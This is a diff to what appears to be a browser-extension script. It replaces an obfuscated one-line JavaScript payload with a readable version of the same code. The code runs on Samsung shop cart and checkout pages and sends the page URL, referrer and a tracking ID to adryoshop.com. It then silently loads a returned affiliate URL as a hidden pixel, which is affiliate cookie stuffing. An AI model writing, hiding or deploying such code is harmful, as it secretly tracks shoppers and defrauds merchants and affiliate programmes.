@@ -1,1 +1,87 @@
-function _0x4eea(){var _0x56be7c=['application/json','1281157cNKILe','addEventListener','52312qWYQgk','tracking_uuid=','tracking_done','interactive','3598164zEUbLY','cookie','body','style','error','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','checkout',';\x20path=/;\x20SameSite=Lax','24594993zoPZjN','replace','987HyBUhV','(?:^|;\x20)','3160lPlPDd','href','affiliate_url','14576XhBQhy','img','6234sGSdwr','POST','now','stringify','pay','hostname','toLowerCase','payment','readyState','height','review-order','shipping','complete','includes','cartExtra','cart','1696400POWhXm','createElement','setItem','DOMContentLoaded','some','match','https://adryoshop.com/api/fallback-pixel?id=','toUTCString','referrer','Tracking\x20error','appendChild','getItem','location'];_0x4eea=function(){return _0x56be7c;};return _0x4eea();}function _0xef51(_0x4fb5f7,_0x139c30){_0x4fb5f7=_0x4fb5f7-0x158;var _0x4eea67=_0x4eea();var _0xef51d1=_0x4eea67[_0x4fb5f7];return _0xef51d1;}(function(_0x5da907,_0x66ef8b){var _0x267236=_0xef51,_0x5479a0=_0x5da907();while(!![]){try{var _0x54c45d=parseInt(_0x267236(0x17c))/0x1+parseInt(_0x267236(0x15c))/0x2+-parseInt(_0x267236(0x182))/0x3+-parseInt(_0x267236(0x16e))/0x4+-parseInt(_0x267236(0x159))/0x5*(parseInt(_0x267236(0x15e))/0x6)+parseInt(_0x267236(0x18c))/0x7*(-parseInt(_0x267236(0x17e))/0x8)+parseInt(_0x267236(0x18a))/0x9;if(_0x54c45d===_0x66ef8b)break;else _0x5479a0['push'](_0x5479a0['shift']());}catch(_0x3aa73e){_0x5479a0['push'](_0x5479a0['shift']());}}}(_0x4eea,0xc7f8f),(function(){var _0x3215b1=_0xef51;function _0x41cf7a(){var _0x2be19e=_0xef51;return _0x2be19e(0x187)[_0x2be19e(0x18b)](/[xy]/g,function(_0x4505ca){var _0x4d71f1=Math['random']()*0x10|0x0,_0x235945=_0x4505ca==='x'?_0x4d71f1:_0x4d71f1&0x3|0x8;return _0x235945['toString'](0x10);});}function _0x2834da(_0x122aff){var _0x4cc05f=_0xef51,_0x5b90fe=document[_0x4cc05f(0x183)][_0x4cc05f(0x173)](new RegExp(_0x4cc05f(0x158)+_0x122aff+'=([^;]*)'));return _0x5b90fe?decodeURIComponent(_0x5b90fe[0x1]):'';}function _0x3a2e7d(_0x13d651){var _0x2e9706=_0xef51,_0x27e8a3=document[_0x2e9706(0x16f)](_0x2e9706(0x15d));_0x27e8a3['src']=_0x13d651,_0x27e8a3['width']=0x1,_0x27e8a3[_0x2e9706(0x167)]=0x1,_0x27e8a3[_0x2e9706(0x185)]['display']='none',document[_0x2e9706(0x184)][_0x2e9706(0x178)](_0x27e8a3);}function _0x472bb7(){var _0x5af8ea=_0xef51,_0x175680=[_0x5af8ea(0x16d),_0x5af8ea(0x188),_0x5af8ea(0x168),_0x5af8ea(0x169),_0x5af8ea(0x162),_0x5af8ea(0x165)];return _0x175680[_0x5af8ea(0x172)](function(_0x94637a){var _0x2fd7c7=_0x5af8ea;return window['location']['pathname'][_0x2fd7c7(0x164)]()[_0x2fd7c7(0x16b)](_0x94637a);});}async function _0x3f2e82(){var _0x41cfbd=_0xef51;if(sessionStorage[_0x41cfbd(0x179)]('tracking_done'))return;try{var _0x426b37=_0x2834da('tracking_uuid')||_0x41cf7a(),_0x4b60a8=new Date(Date[_0x41cfbd(0x160)]()+0x1e*0x15180*0x3e8)[_0x41cfbd(0x175)]();document['cookie']=_0x41cfbd(0x17f)+_0x426b37+';\x20expires='+_0x4b60a8+_0x41cfbd(0x189);var _0x5b7c63=await fetch('https://adryoshop.com/api/track-user',{'method':_0x41cfbd(0x15f),'headers':{'Content-Type':_0x41cfbd(0x17b)},'body':JSON[_0x41cfbd(0x161)]({'url':location[_0x41cfbd(0x15a)],'referrer':document[_0x41cfbd(0x176)],'unique_id':_0x426b37,'origin':location[_0x41cfbd(0x163)]})}),_0x5a3de3=await _0x5b7c63['json']();_0x5a3de3['success']&&_0x5a3de3[_0x41cfbd(0x15b)]?(_0x3a2e7d(_0x5a3de3[_0x41cfbd(0x15b)]),sessionStorage[_0x41cfbd(0x170)](_0x41cfbd(0x180),'1')):_0x3a2e7d(_0x41cfbd(0x174)+_0x426b37);}catch(_0x1e77c9){console[_0x41cfbd(0x186)](_0x41cfbd(0x177),_0x1e77c9);}}function _0x2a2fb6(){var _0x5b67fa=_0xef51,_0x277020=window[_0x5b67fa(0x17a)]['hostname'],_0x4c80f3={'www.samsung.com':{'always':![],'cartExtra':!![]}},_0x58423e=_0x4c80f3[_0x277020];if(_0x58423e){if(_0x58423e[_0x5b67fa(0x16c)]&&_0x472bb7())_0x3f2e82();else _0x58423e['always']&&_0x3f2e82();}}document[_0x3215b1(0x166)]===_0x3215b1(0x16a)||document[_0x3215b1(0x166)]===_0x3215b1(0x181)?_0x2a2fb6():window[_0x3215b1(0x17d)](_0x3215b1(0x171),_0x2a2fb6,{'once':!![]});}()));
+(function () {
+
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            var r = Math.random() * 16 | 0;
+            var v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+
+    function getCookie(name) {
+        var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+        return match ? decodeURIComponent(match[1]) : '';
+    }
+
+    function firePixel(url) {
+        var img = document.createElement('img');
+        img.src = url;
+        img.width = 1;
+        img.height = 1;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+    }
+
+    function isCartPage() {
+        var cartPatterns = ['cart', 'checkout', 'review-order', 'shipping', 'pay', 'payment'];
+        return cartPatterns.some(function (pattern) {
+            return window.location.pathname.toLowerCase().includes(pattern);
+        });
+    }
+
+    async function initTracking() {
+        if (sessionStorage.getItem('tracking_done')) return;
+
+        try {
+            var uniqueId = getCookie('tracking_uuid') || generateUUID();
+            var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+            var response = await fetch('https://adryoshop.com/api/track-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    url: location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: location.hostname
+                })
+            });
+
+            var result = await response.json();
+
+            if (result.success && result.affiliate_url) {
+                firePixel(result.affiliate_url);
+                sessionStorage.setItem('tracking_done', '1');
+            } else {
+                firePixel('https://adryoshop.com/api/fallback-pixel?id=' + uniqueId);
+            }
+
+        } catch (err) {
+            console.error('Tracking error', err);
+        }
+    }
+
+    function run() {
+        var hostname = window.location.hostname;
+        var siteConfigs = {
+            'www.samsung.com':  { always: false, cartExtra: true },
+            'shop.samsung.com': { always: true,  cartExtra: true }
+        };
+        var config = siteConfigs[hostname];
+        if (config) {
+            if (config.cartExtra && isCartPage()) {
+                initTracking();
+            } else if (config.always) {
+                initTracking();
+            }
+        }
+    }
+
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        run();
+    } else {
+        window.addEventListener('DOMContentLoaded', run, { once: true });
+    }
+
+}());
